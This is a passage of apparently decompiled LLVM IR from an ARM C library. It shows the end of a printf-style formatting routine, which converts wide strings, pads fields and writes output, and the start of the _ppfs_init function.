dec_label_pc_106c4:                               ; preds = %dec_label_pc_106bc
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_106cc = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_106cc, i32* %r0.global-to-local, align 4
  br i1 %v7_106bc, label %dec_label_pc_106d4, label %dec_label_pc_1070c

dec_label_pc_106d4:                               ; preds = %dec_label_pc_106c4
  %v1_106d4 = inttoptr i32 %v3_106cc to i32*
  %v2_106d4 = load i32, i32* %v1_106d4, align 4
  %v9_106d8 = icmp eq i32 %v2_106d4, 0
  store i32 %v2_106d4, i32* %stack_var_-44, align 4
  br i1 %v9_106d8, label %dec_label_pc_10784, label %dec_label_pc_106e4

dec_label_pc_106e4:                               ; preds = %dec_label_pc_106d4
  %v3_106e4 = load i32, i32* %stack_var_-348, align 4
  store i32 %v2_106e8, i32* @r0, align 4
  %v4_106ec = ashr i32 %v3_106e4, 31
  %v5_106ec = or i32 %v4_106ec, %v3_106e4
  store i32 %v5_106ec, i32* %r2.global-to-local, align 4
  store i32 %v2_106e8, i32* @r1, align 4
  %v6_106f8 = call i32 @__GI_wcsrtombs(i32 %v2_106e8, i32 %v2_106e8, i32 %v5_106ec, i32 %v2_106f4, i32 0, i32 %v2_106d4)
  store i32 %v6_106f8, i32* %r0.global-to-local, align 4
  %v3_106fc = icmp eq i32 %v6_106f8, -1
  store i32 %v6_106f8, i32* @r5, align 4
  br i1 %v3_106fc, label %dec_label_pc_109d8, label %dec_label_pc_10870

dec_label_pc_1070c:                               ; preds = %dec_label_pc_106c4
  store i32 %v2_107ec, i32* %r7.global-to-local, align 4
  %v1_10710 = inttoptr i32 %v3_106cc to i32*
  %v2_10710 = load i32, i32* %v1_10710, align 4
  store i32 %v2_106f4, i32* %r2.global-to-local, align 4
  store i32 %v2_107ec, i32* %r0.global-to-local, align 4
  %v5_1071c = call i32 @__GI_wcrtomb(i32 %v2_107ec, i32 %v2_10710, i32 %v2_106f4, i32 %tmp105, i32 0)
  store i32 %v5_1071c, i32* %r0.global-to-local, align 4
  %v7_10720 = icmp eq i32 %v5_1071c, -1
  store i32 %v5_1071c, i32* @r5, align 4
  br i1 %v7_10720, label %dec_label_pc_109d8, label %dec_label_pc_1072c

dec_label_pc_1072c:                               ; preds = %dec_label_pc_1070c
  %v0_1072c = load i32, i32* @sl, align 4
  store i32 %v0_1072c, i32* @r8, align 4
  store i32 %v2_107ec, i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  %v1_1073c = trunc i32 %v0_1072c to i8
  %v2_1073c = load i32, i32* %r7.global-to-local, align 4
  %v4_1073c = add i32 %v2_1073c, %v5_1071c
  %v5_1073c = inttoptr i32 %v4_1073c to i8*
  store i8 %v1_1073c, i8* %v5_1073c, align 1
  %v0_10884.pre.pre = load i32, i32* @r8, align 4
  %v1_10884.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10880thread-pre-split

dec_label_pc_10744:                               ; preds = %dec_label_pc_106bc
  br i1 %v3_10748, label %dec_label_pc_107e0, label %dec_label_pc_1074c

dec_label_pc_1074c:                               ; preds = %dec_label_pc_10744
  %v3_1074c = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_1074c, i32* %r0.global-to-local, align 4
  %v1_10754 = inttoptr i32 %v3_1074c to i32*
  %v2_10754 = load i32, i32* %v1_10754, align 4
  br i1 %v7_10744, label %dec_label_pc_10754, label %dec_label_pc_107b8

dec_label_pc_10754:                               ; preds = %dec_label_pc_1074c
  store i32 %v2_10754, i32* @r4, align 4
  %v2_10758 = icmp eq i32 %v2_10754, 0
  br i1 %v2_10758, label %dec_label_pc_10784, label %dec_label_pc_10760

dec_label_pc_10760:                               ; preds = %dec_label_pc_10754, %dec_label_pc_107e8
  %v0_10764 = phi i32 [ %v2_10754, %dec_label_pc_10754 ], [ %v3_107f8, %dec_label_pc_107e8 ]
  %v3_10760 = load i32, i32* %stack_var_-348, align 4
  store i32 %v0_10764, i32* %r0.global-to-local, align 4
  %v4_10768 = ashr i32 %v3_10760, 31
  %v5_10768 = or i32 %v4_10768, %v3_10760
  %v2_1076c = inttoptr i32 %v0_10764 to i8*
  %v3_1076c = call i32 @strnlen(i8* %v2_1076c, i32 %v5_10768)
  store i32 %v3_1076c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v3_1076c, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_10880

dec_label_pc_10784:                               ; preds = %dec_label_pc_10754, %dec_label_pc_106d4
  %v3_10784 = load i32, i32* %stack_var_-348, align 4
  %v1_10788 = icmp slt i32 %v3_10784, 0
  br i1 %v1_10788, label %dec_label_pc_107a0, label %dec_label_pc_10790

dec_label_pc_10790:                               ; preds = %dec_label_pc_10784
  %tmp212 = icmp ult i32 %v3_10784, 6
  br i1 %tmp212, label %dec_label_pc_107a8, label %dec_label_pc_107a0

dec_label_pc_107a0:                               ; preds = %dec_label_pc_10790, %dec_label_pc_10784
  br label %dec_label_pc_107a8

dec_label_pc_107a8:                               ; preds = %dec_label_pc_10790, %dec_label_pc_107a0
  %storemerge97 = phi i32 [ 6, %dec_label_pc_107a0 ], [ 0, %dec_label_pc_10790 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 0, i32* @r8, align 4
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 -38240), i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_10880

dec_label_pc_107b8:                               ; preds = %dec_label_pc_1074c
  store i32 %v2_10754, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_107ec, i32* @r4, align 4
  store i32 %v2_10754, i32* %stack_var_-200, align 4
  br label %dec_label_pc_10880thread-pre-split

dec_label_pc_107e0:                               ; preds = %dec_label_pc_10744
  br i1 %v7_107e0, label %dec_label_pc_107e8, label %dec_label_pc_10804

dec_label_pc_107e8:                               ; preds = %dec_label_pc_107e0
  %v0_107e8 = call i32 @__GI___errno_location()
  store i32 %v0_107e8, i32* %r0.global-to-local, align 4
  %v1_107f0 = inttoptr i32 %v0_107e8 to i32*
  %v2_107f0 = load i32, i32* %v1_107f0, align 4
  store i32 %v2_107f0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_107f8 = call i32 @__GI___glibc_strerror_r(i32 %v2_107f0, i32 %v2_107ec, i32 128)
  store i32 %v3_107f8, i32* %r0.global-to-local, align 4
  store i32 %v3_107f8, i32* @r4, align 4
  br label %dec_label_pc_10760

dec_label_pc_10804:                               ; preds = %dec_label_pc_107e0
  %v4_1080c = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 852) to i32*), align 4
  %v1_10814 = add i32 %v4_1080c, 10
  store i32 %v1_10814, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10818

dec_label_pc_10818:                               ; preds = %dec_label_pc_10860, %dec_label_pc_10804
  %v1_10828 = phi i32 [ %v1_10860, %dec_label_pc_10860 ], [ %v4_1080c, %dec_label_pc_10804 ]
  %v1_10818 = inttoptr i32 %v1_10828 to i8*
  %v2_10818 = load i8, i8* %v1_10818, align 1
  %v3_10818 = zext i8 %v2_10818 to i32
  store i32 %v3_10818, i32* %r2.global-to-local, align 4
  %v9_10820 = icmp eq i32 %v3_10818, %tmp99
  br i1 %v9_10820, label %dec_label_pc_10828, label %dec_label_pc_10860

dec_label_pc_10828:                               ; preds = %dec_label_pc_10818
  %v2_10828 = sub i32 %v1_10828, %v4_1080c
  %v0_1082c = load i32, i32* @fp, align 4
  store i32 %v0_1082c, i32* %r0.global-to-local, align 4
  store i32 %v2_10834, i32* %r2.global-to-local, align 4
  %v4_1083c = mul i32 %v2_10828, 4
  %v5_1083c = add i32 %v4_1083c, add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 26404)
  %v6_1083c = inttoptr i32 %v5_1083c to i32*
  %v7_1083c = load i32, i32* %v6_1083c, align 4
  store i32 %v7_1083c, i32* @ip, align 4
  store i32 67656, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_1083c)
  %v0_10848 = load i32, i32* %r0.global-to-local, align 4
  %v1_10848 = icmp slt i32 %v0_10848, 0
  br i1 %v1_10848, label %dec_label_pc_109d8, label %dec_label_pc_10850

dec_label_pc_10850:                               ; preds = %dec_label_pc_10828
  %v2_10854 = add i32 %v0_10848, %v1_108b0
  br label %dec_label_pc_109c4

dec_label_pc_10860:                               ; preds = %dec_label_pc_10818
  %v1_10860 = add i32 %v1_10828, 1
  %v3_10864 = icmp ult i32 %v1_10860, %v1_10814
  br i1 %v3_10864, label %dec_label_pc_10818, label %dec_label_pc_109d8

dec_label_pc_10870:                               ; preds = %dec_label_pc_106e4
  %v0_10870 = load i32, i32* @sl, align 4
  store i32 %v0_10870, i32* @r8, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_10870, i32* @r4, align 4
  br label %dec_label_pc_10880

dec_label_pc_10880thread-pre-split:               ; preds = %.thread85, %dec_label_pc_10674, %dec_label_pc_1072c, %dec_label_pc_107b8
  %v1_10884.pre = phi i32 [ %v1_10884.pre205, %dec_label_pc_10674 ], [ %v1_10884.pre.pre, %dec_label_pc_1072c ], [ 1, %dec_label_pc_107b8 ], [ %v2_105f4, %.thread85 ]
  %v0_10884.pre = phi i32 [ 0, %dec_label_pc_10674 ], [ %v0_10884.pre.pre, %dec_label_pc_1072c ], [ 0, %dec_label_pc_107b8 ], [ %v2_10668, %.thread85 ]
  %stack_var_-336.3.ph = phi i32 [ %v0_105e8, %dec_label_pc_10674 ], [ %v0_10518, %dec_label_pc_1072c ], [ %v0_10518, %dec_label_pc_107b8 ], [ %v0_105e8, %.thread85 ]
  %v0_10880.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_10880

dec_label_pc_10880:                               ; preds = %dec_label_pc_10880thread-pre-split, %dec_label_pc_107a8, %dec_label_pc_10760, %dec_label_pc_10870
  %v1_10884 = phi i32 [ %v1_10884.pre, %dec_label_pc_10880thread-pre-split ], [ %storemerge97, %dec_label_pc_107a8 ], [ %v3_1076c, %dec_label_pc_10760 ], [ %v6_106f8, %dec_label_pc_10870 ]
  %v0_10884 = phi i32 [ %v0_10884.pre, %dec_label_pc_10880thread-pre-split ], [ 0, %dec_label_pc_107a8 ], [ 0, %dec_label_pc_10760 ], [ %v0_10870, %dec_label_pc_10870 ]
  %v0_1088c = phi i32 [ %v0_10880.pr, %dec_label_pc_10880thread-pre-split ], [ 11, %dec_label_pc_107a8 ], [ 11, %dec_label_pc_10760 ], [ 11, %dec_label_pc_10870 ]
  %v0_108cc = phi i32 [ %stack_var_-336.3.ph, %dec_label_pc_10880thread-pre-split ], [ %v0_10518, %dec_label_pc_107a8 ], [ %v0_10518, %dec_label_pc_10760 ], [ %v0_10518, %dec_label_pc_10870 ]
  %v7_10880 = icmp eq i32 %v0_1088c, 11
  %v2_10884 = add i32 %v1_10884, %v0_10884
  br i1 %v7_10880, label %dec_label_pc_1089c, label %bb173

bb173:                                            ; preds = %dec_label_pc_10880
  %v7_10894 = icmp sgt i32 %v0_1088c, 5
  %. = select i1 %v7_10894, i32 2, i32 1
  %v2_10898 = add i32 %v2_10884, %.
  br label %dec_label_pc_1089c

dec_label_pc_1089c:                               ; preds = %dec_label_pc_10880, %bb173
  %v0_108b0 = phi i32 [ %v2_10884, %dec_label_pc_10880 ], [ %v2_10898, %bb173 ]
  store i32 %tmp98, i32* %r2.global-to-local, align 4
  %v3_108a0 = icmp uge i32 %tmp98, %v0_108b0
  %v9_108a0 = icmp eq i32 %tmp98, %v0_108b0
  %v2_108a4 = xor i1 %v9_108a0, true
  %v3_108a4 = and i1 %v3_108a0, %v2_108a4
  br i1 %v3_108a4, label %bb174, label %bb175

bb174:                                            ; preds = %dec_label_pc_1089c
  %v2_108a0 = sub i32 %tmp98, %v0_108b0
  store i32 %v2_108a0, i32* @sl, align 4
  br label %bb175

bb175:                                            ; preds = %dec_label_pc_1089c, %bb174
  store i32 %v1_108b0, i32* %r2.global-to-local, align 4
  %v2_108ac = xor i1 %v3_108a0, true
  %v3_108ac = or i1 %v9_108a0, %v2_108ac
  br i1 %v3_108ac, label %bb176, label %._crit_edge

._crit_edge:                                      ; preds = %bb175
  %v1_108b4.pre = load i32, i32* @sl, align 4
  br label %bb177

bb176:                                            ; preds = %bb175
  store i32 0, i32* @sl, align 4
  br label %bb177

bb177:                                            ; preds = %._crit_edge, %bb176
  %v2_108c4 = phi i32 [ %v1_108b4.pre, %._crit_edge ], [ 0, %bb176 ]
  %v2_108b0 = add i32 %v0_108b0, %v1_108b0
  %v2_108b4 = add i32 %v2_108b0, %v2_108c4
  %v0_108c0 = load i32, i32* @sb, align 4
  %v7_108c0 = icmp eq i32 %v0_108c0, 48
  br i1 %v7_108c0, label %bb178, label %.thread30

bb178:                                            ; preds = %bb177
  %v3_108c4 = add i32 %v2_108c4, %v0_10884
  store i32 %v3_108c4, i32* @r8, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread30

.thread30:                                        ; preds = %bb177, %bb178
  %v0_108dc = phi i32 [ %v2_108c4, %bb177 ], [ 0, %bb178 ]
  %v1_108cc = and i32 %v0_108cc, 8
  store i32 %v1_108cc, i32* @r7, align 4
  %v2_108cc = icmp eq i32 %v1_108cc, 0
  br i1 %v2_108cc, label %dec_label_pc_108d4, label %dec_label_pc_108f0

dec_label_pc_108d4:                               ; preds = %.thread30
  %v0_108d4 = load i32, i32* @fp, align 4
  store i32 %v0_108d4, i32* %r0.global-to-local, align 4
  store i32 %v0_108dc, i32* %r2.global-to-local, align 4
  %v4_108e0 = call i32 @_charpad(i32 %v0_108d4, i8 32, i32 %v0_108dc)
  store i32 %v4_108e0, i32* %r0.global-to-local, align 4
  %v1_108e4 = load i32, i32* @sl, align 4
  %v9_108e4 = icmp eq i32 %v4_108e0, %v1_108e4
  br i1 %v9_108e4, label %dec_label_pc_108ec, label %dec_label_pc_109d8

dec_label_pc_108ec:                               ; preds = %dec_label_pc_108d4
  %v0_108ec = load i32, i32* @r7, align 4
  store i32 %v0_108ec, i32* @sl, align 4
  %v0_108f8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_108f0

dec_label_pc_108f0:                               ; preds = %.thread30, %dec_label_pc_108ec
  %v0_108f8 = phi i32 [ %v0_1088c, %.thread30 ], [ %v0_108f8.pre, %dec_label_pc_108ec ]
  %v0_108f4 = load i32, i32* @fp, align 4
  %v2_108f8 = add i32 %v0_108f8, add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 -38232)
  store i32 %v2_108f8, i32* %r0.global-to-local, align 4
  %v2_108fc = inttoptr i32 %v2_108f8 to i8*
  %v3_108fc = call i32 @__GI_fputs_unlocked(i8* %v2_108fc, i32 %v0_108f4)
  %v0_10900 = load i32, i32* @fp, align 4
  store i32 %v0_10900, i32* %r0.global-to-local, align 4
  %v0_10908 = load i32, i32* @r8, align 4
  store i32 %v0_10908, i32* %r2.global-to-local, align 4
  %v4_1090c = call i32 @_charpad(i32 %v0_10900, i8 48, i32 %v0_10908)
  store i32 %v4_1090c, i32* %r0.global-to-local, align 4
  %v1_10910 = load i32, i32* @r8, align 4
  %v9_10910 = icmp eq i32 %v4_1090c, %v1_10910
  br i1 %v9_10910, label %dec_label_pc_10918, label %dec_label_pc_109d8

dec_label_pc_10918:                               ; preds = %dec_label_pc_108f0
  %v3_10918 = load i32, i32* %stack_var_-44, align 4
  %v2_1091c = icmp eq i32 %v3_10918, 0
  br i1 %v2_1091c, label %dec_label_pc_10924, label %dec_label_pc_10948

dec_label_pc_10924:                               ; preds = %dec_label_pc_10918
  %v0_10924 = load i32, i32* @r5, align 4
  %v2_10924 = icmp eq i32 %v0_10924, 0
  br i1 %v2_10924, label %dec_label_pc_109ac, label %dec_label_pc_1092c

dec_label_pc_1092c:                               ; preds = %dec_label_pc_10924
  %v0_1092c = load i32, i32* @r4, align 4
  store i32 %v0_1092c, i32* %r0.global-to-local, align 4
  %v0_10934 = load i32, i32* @fp, align 4
  store i32 %v0_10934, i32* %r2.global-to-local, align 4
  %v3_10938 = inttoptr i32 %v0_10934 to i16*
  %v4_10938 = call i32 @__stdio_fwrite(i32 %v0_1092c, i32 %v0_10924, i16* %v3_10938)
  store i32 %v4_10938, i32* %r0.global-to-local, align 4
  %v1_1093c = load i32, i32* @r5, align 4
  %v9_1093c = icmp eq i32 %v4_10938, %v1_1093c
  br i1 %v9_1093c, label %dec_label_pc_109ac, label %dec_label_pc_109d8

dec_label_pc_10948:                               ; preds = %dec_label_pc_10918
  store i32 %v2_107ec, i32* @r6, align 4
  store i32 %v2_106e8, i32* @r8, align 4
  store i32 %v2_106f4, i32* @r7, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_10998.pr = load i32, i32* @r5, align 4
  %v2_1099841 = icmp eq i32 %v0_10998.pr, 0
  store i32 %v2_106e8, i32* @r1, align 4
  store i32 %v2_107ec, i32* @r0, align 4
  br i1 %v2_1099841, label %dec_label_pc_109ac, label %dec_label_pc_10960

dec_label_pc_10960:                               ; preds = %dec_label_pc_10948, %dec_label_pc_10994
  %v1_10964 = phi i32 [ %v2_10994, %dec_label_pc_10994 ], [ %v0_10998.pr, %dec_label_pc_10948 ]
  %v2_10960 = icmp ult i32 %v1_10964, 128
  %.v1_10964 = select i1 %v2_10960, i32 %v1_10964, i32 128
  store i32 %.v1_10964, i32* %r2.global-to-local, align 4
  %v6_1096c = call i32 @__GI_wcsrtombs(i32 %v2_107ec, i32 %v2_106e8, i32 %.v1_10964, i32 %v2_106f4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_1096c, i32* @r4, align 4
  %v2_10970 = icmp eq i32 %v6_1096c, 0
  store i32 %v6_1096c, i32* %r0.global-to-local, align 4
  br i1 %v2_10970, label %dec_label_pc_10994, label %dec_label_pc_1097c

dec_label_pc_1097c:                               ; preds = %dec_label_pc_10960
  store i32 %v2_107ec, i32* %r0.global-to-local, align 4
  %v0_10984 = load i32, i32* @fp, align 4
  store i32 %v0_10984, i32* %r2.global-to-local, align 4
  %v3_10988 = inttoptr i32 %v0_10984 to i16*
  %v4_10988 = call i32 @__stdio_fwrite(i32 %v2_107ec, i32 %v6_1096c, i16* %v3_10988)
  store i32 %v4_10988, i32* %r0.global-to-local, align 4
  %v1_1098c = load i32, i32* @r4, align 4
  %v9_1098c = icmp eq i32 %v4_10988, %v1_1098c
  br i1 %v9_1098c, label %dec_label_pc_10994, label %dec_label_pc_109d8

dec_label_pc_10994:                               ; preds = %dec_label_pc_1097c, %dec_label_pc_10960
  %v0_10994 = phi i32 [ %v4_10988, %dec_label_pc_1097c ], [ 0, %dec_label_pc_10960 ]
  %v1_10994 = load i32, i32* @r5, align 4
  %v2_10994 = sub i32 %v1_10994, %v0_10994
  store i32 %v2_10994, i32* @r5, align 4
  %v2_10998 = icmp eq i32 %v2_10994, 0
  store i32 %v2_106e8, i32* @r1, align 4
  store i32 %v2_107ec, i32* @r0, align 4
  br i1 %v2_10998, label %dec_label_pc_109ac, label %dec_label_pc_10960

dec_label_pc_109ac:                               ; preds = %dec_label_pc_10994, %dec_label_pc_10948, %dec_label_pc_1092c, %dec_label_pc_10924
  %v0_109ac = load i32, i32* @fp, align 4
  store i32 %v0_109ac, i32* %r0.global-to-local, align 4
  %v0_109b4 = load i32, i32* @sl, align 4
  store i32 %v0_109b4, i32* %r2.global-to-local, align 4
  %v4_109b8 = call i32 @_charpad(i32 %v0_109ac, i8 32, i32 %v0_109b4)
  store i32 %v4_109b8, i32* %r0.global-to-local, align 4
  %v1_109bc = load i32, i32* @sl, align 4
  %v9_109bc = icmp eq i32 %v4_109b8, %v1_109bc
  br i1 %v9_109bc, label %dec_label_pc_109c4, label %dec_label_pc_109d8

dec_label_pc_109c4:                               ; preds = %dec_label_pc_109ac, %dec_label_pc_10850, %dec_label_pc_106ac, %dec_label_pc_104bc
  %stack_var_-336.4 = phi i32 [ %v0_10518, %dec_label_pc_104bc ], [ %v0_108cc, %dec_label_pc_109ac ], [ %v0_10518, %dec_label_pc_10850 ], [ %v0_10518, %dec_label_pc_106ac ]
  %stack_var_-356.3 = phi i32 [ %v1_108b0, %dec_label_pc_104bc ], [ %v2_108b4, %dec_label_pc_109ac ], [ %v2_10854, %dec_label_pc_10850 ], [ %v2_106b0, %dec_label_pc_106ac ]
  %v3_109c4 = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_109c4, i32* @r4, align 4
  store i32 %v3_109c4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_103e4.outer

dec_label_pc_109d0:                               ; preds = %dec_label_pc_10440
  %v1_109d0 = add i32 %v0_10448, 2
  store i32 %v1_109d0, i32* @r4, align 4
  br label %dec_label_pc_103e4.outer36

dec_label_pc_109d8:                               ; preds = %dec_label_pc_10860, %dec_label_pc_106e4, %dec_label_pc_109ac, %dec_label_pc_1092c, %dec_label_pc_108f0, %dec_label_pc_108d4, %dec_label_pc_10828, %dec_label_pc_1070c, %dec_label_pc_10684, %bb142, %dec_label_pc_1097c
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_109e0

dec_label_pc_109e0:                               ; preds = %dec_label_pc_10434, %bb, %dec_label_pc_10378, %dec_label_pc_109d8
  %stack_var_-356.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_10378 ], [ -1, %dec_label_pc_109d8 ], [ %v1_108b0, %dec_label_pc_10434 ]
  store i32 %stack_var_-356.4, i32* %r0.global-to-local, align 4
  store i32 %v6_10328, i32* @r5, align 4
  store i32 %v12_10328, i32* %r7.global-to-local, align 4
  store i32 %v18_10328, i32* @sb, align 4
  store i32 %v21_10328, i32* @sl, align 4
  store i32 %v24_10328, i32* @fp, align 4
  ret i32 %stack_var_-356.4

; uselistorder directives
  uselistorder i32 %stack_var_-356.4, { 1, 0 }
  uselistorder i32 %v1_109d0, { 1, 0 }
  uselistorder i32 %v3_109c4, { 1, 2, 0 }
  uselistorder i32 %v2_10994, { 1, 2, 0 }
  uselistorder i32 %v0_108dc, { 1, 0 }
  uselistorder i32 %v2_108c4, { 2, 0, 1 }
  uselistorder i1 %v9_108a0, { 1, 0 }
  uselistorder i32 %v2_10884, { 1, 0 }
  uselistorder i32 %v0_108cc, { 1, 0 }
  uselistorder i32 %v0_10884, { 1, 0 }
  uselistorder i32 %v1_10860, { 1, 0 }
  uselistorder i32 %v1_10828, { 1, 0, 2 }
  uselistorder i32 %v3_107f8, { 1, 2, 0 }
  uselistorder i32 %v0_10764, { 1, 0 }
  uselistorder i32 %v2_10754, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_1071c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_10694, { 1, 0 }
  uselistorder i32 %v2_105f4, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 %v0_10610, { 1, 2, 3, 0 }
  uselistorder i32 %v2_10590, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_104f8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1049c.pre, { 1, 0, 2 }
  uselistorder i32 %v1_10494, { 1, 0 }
  uselistorder i32 %v1_10440, { 0, 1, 3, 2 }
  uselistorder i32 %v1_108b0, { 0, 8, 1, 7, 2, 3, 6, 5, 4, 9, 10 }
  uselistorder i32 %v2_10400, { 1, 0 }
  uselistorder i32 %v1_103f8.lcssa, { 1, 0 }
  uselistorder i8 %v2_103e4, { 1, 0 }
  uselistorder i32 %v2_103f8, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-356.1.ph37, { 1, 0 }
  uselistorder i32 %v5_10410, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10518, { 6, 4, 3, 15, 14, 5, 0, 1, 13, 12, 11, 7, 10, 8, 2, 9 }
  uselistorder i1 %v7_10608, { 1, 0 }
  uselistorder i1 %v7_10558, { 1, 2, 0 }
  uselistorder i1 %v7_10744, { 1, 0 }
  uselistorder i1 %v7_106bc, { 1, 0 }
  uselistorder i1 %v7_10598, { 1, 0 }
  uselistorder i32 %v2_106f4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_106e8, { 1, 2, 3, 0, 6, 4, 5, 7 }
  uselistorder i32 %v2_107ec, { 1, 2, 3, 4, 5, 0, 11, 10, 9, 7, 8, 6 }
  uselistorder i32 %v2_10498, { 1, 3, 2, 0 }
  uselistorder i32 %v4_10474, { 1, 0 }
  uselistorder i32 %v2_10330, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-352, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp105, { 1, 2, 0 }
  uselistorder i32 %tmp104, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp98, { 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 20, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 21, 22, 23, 24, 30, 31, 25, 26, 27, 28, 29, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 9, 8, 10, 12, 11, 17, 13, 14, 15, 16, 18, 19, 22, 20, 21, 24, 23, 26, 25, 28, 27, 30, 29, 33, 31, 32, 36, 37, 34, 35, 47, 38, 48, 1, 40, 39, 42, 41, 44, 43, 46, 45, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 -89452), { 1, 0 }
  uselistorder label %dec_label_pc_109e0, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_109d8, { 2, 10, 3, 4, 5, 0, 6, 7, 1, 8, 9 }
  uselistorder label %dec_label_pc_10960, { 1, 0 }
  uselistorder label %dec_label_pc_108f0, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %dec_label_pc_1089c, { 1, 0 }
  uselistorder label %dec_label_pc_10880, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10880thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_107a8, { 1, 0 }
  uselistorder label %dec_label_pc_10760, { 1, 0 }
  uselistorder label %dec_label_pc_10674, { 0, 2, 1 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 4, 1, 2, 0, 3 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 4, 3, 1, 0, 2 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_10548, { 1, 0 }
  uselistorder label %dec_label_pc_10544, { 2, 1, 0 }
  uselistorder label %bb151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10490, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_10434, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_10400, { 1, 0, 2 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_103e4.outer36, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_10a10 = load i32, i32* @r4, align 4
  %v6_10a10 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_10a1c = load i32, i32* @r1, align 4
  store i32 %v0_10a1c, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_10a28 = bitcast i32* %arg1 to i8*
  %v3_10a28 = call i32 @__GI_memset(i8* %v2_10a28, i32 0)
  store i32 %v3_10a28, i32* %r0.global-to-local, align 4
  %v0_10a2c = load i32, i32* @r4, align 4
  %v1_10a2c = add i32 %v0_10a2c, 24
  %v2_10a2c = inttoptr i32 %v1_10a2c to i32*
  %v3_10a2c = load i32, i32* %v2_10a2c, align 4
  store i32 %v3_10a2c, i32* %r3.global-to-local, align 4
  %v0_10a30 = load i32, i32* @r5, align 4
  %v2_10a30 = inttoptr i32 %v0_10a2c to i32*
  store i32 %v0_10a30, i32* %v2_10a30, align 4
  %v0_10a34 = load i32, i32* %r3.global-to-local, align 4
  %v1_10a34 = add i32 %v0_10a34, -1
  %v1_10a38 = load i32, i32* @r4, align 4
  %v2_10a38 = add i32 %v1_10a38, 24
  %v3_10a38 = inttoptr i32 %v2_10a38 to i32*
  store i32 %v1_10a34, i32* %v3_10a38, align 4
  %v0_10a3c = load i32, i32* @r4, align 4
  %v1_10a3c = add i32 %v0_10a3c, 40
  store i32 %v1_10a3c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_10a4c21 = inttoptr i32 %v1_10a3c to i32*
